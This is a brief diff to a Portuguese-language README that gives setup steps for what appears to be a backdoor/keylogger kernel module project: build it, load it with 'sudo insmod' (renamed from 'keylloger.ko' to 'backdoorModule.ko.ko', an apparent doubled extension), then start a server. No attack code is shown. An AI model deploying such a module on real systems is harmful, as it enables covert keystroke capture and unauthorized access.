@@ -28,7 +28,7 @@ Está disponível em https://www.oracle.com/virtualization/technologies/vm/downl
 
 1. Mova para o diretório backdoor, nele utilize os seguintes comandos:
     -make
-    -sudo insmod keylloger.ko
+    -sudo insmod backdoorModule.ko.ko
 Os quais compilam o módulo de kernel e o carrega.
 
 2. Em seguida mova para o diretório do servidor, e novamente de os comandos:
